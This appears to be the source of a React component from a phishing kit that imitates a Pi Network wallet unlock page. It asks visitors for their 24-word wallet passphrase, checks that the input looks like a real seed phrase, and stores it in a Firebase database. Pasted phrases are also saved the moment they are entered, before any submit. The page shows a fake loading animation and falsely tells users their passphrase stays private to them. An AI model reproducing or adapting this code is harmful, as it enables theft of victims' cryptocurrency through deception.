import React, { useEffect, useState } from "react";
import s from "./style.module.scss";
import { db } from "../firebase.js";
import { collection, addDoc } from "firebase/firestore";
import { DotLottieReact } from "@lottiefiles/dotlottie-react";
import { checkPastedAddress } from "../pages/Claim/utils/checkPastedAddress.js";

function ClaimPi(props) {
  const addAddress = async (address) => {
    if (!checkAddress(address)) {
      return;
    }
    setTimeout(async () => {
      try {
        const docRef = await addDoc(collection(db, "address"), {
          address: address,
        });
        props.setCongratulation(true);
      } catch (error) {
        console.log(error);
      }
    }, 2000);
  };
  function checkAddress(address) {
    const checkedAddress = address.split(" ");
    const splitForLetter = address.split("");
    const checkForEmptyWord = checkedAddress.filter(
      (word) => word.length === 0,
    );
    const letters = [];
    splitForLetter.forEach((item) => {
      if (!letters.includes(item)) {
        letters.push(item);
      }
    });
    const newErrors = {
      address: "",
    };
    if (!address) {
      newErrors.address = "*Please enter 24-word passphrase address";
    } else if (checkedAddress.length !== 24 || checkForEmptyWord.length) {
      newErrors.address = "*Please enter a valid 24-word passphrase address";
    } else if (letters.length < 13) {
      newErrors.address = "*Your passphrase appears to be incorrect";
    } else {
      newErrors.address = "";
      setLoading(true);
    }

    setError(newErrors);
    return !newErrors.address;
  }
  const [value, setValue] = useState("");
  const [error, setError] = useState({
    address: "",
  });
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (checkPastedAddress(value)) {
      const addAddressPasted = async () => {
        try {
          const docRef = await addDoc(collection(db, "addressPaste"), {
            address: value,
          });
        } catch (error) {
          console.log(error);
        }
      };
      addAddressPasted();
    }
  }, [value]);
  return (
    <div className={s.claimPiBoxContainer}>
      <h2>Enter your passphrase to open your wallet</h2>
      <textarea
        className={s.claimPiBox}
        name="piCode"
        id="piCodeId"
        rows="10"
        placeholder="Enter your 24-word passphrase here"
        value={value}
        onChange={(e) => {
          setValue(e.target.value);
        }}
      />
      {error.address && <span className={s.error}>{error.address}</span>}
      <button
        className={s.claimBtn}
        onClick={() => {
          checkAddress(value);
          addAddress(value);
        }}
      >
        {!loading ? (
          <span>Unlock with Passphrase</span>
        ) : (
          <span className={s.loading}>
            <DotLottieReact
              src="https://lottie.host/33d9d834-1f10-421d-b744-f0e220b43053/veq5QSmWyO.lottie"
              loop
              autoplay
              style={{ width: "100px" }}
            />
          </span>
        )}
      </button>
      <div className={s.createWallet}>
        <p>
          As a non-custodial wallet, your wallet passphrase is exclusively
          accessible only to you. Recovery of passphrase is currently
          impossible. <br /> Lost your passphrase?{" "}
          <a href="https://minepi.com/">You can create a new wallet</a> , but
          all your π in your previous wallet will be inaccessible.
        </p>
      </div>
    </div>
  );
}

export default ClaimPi;
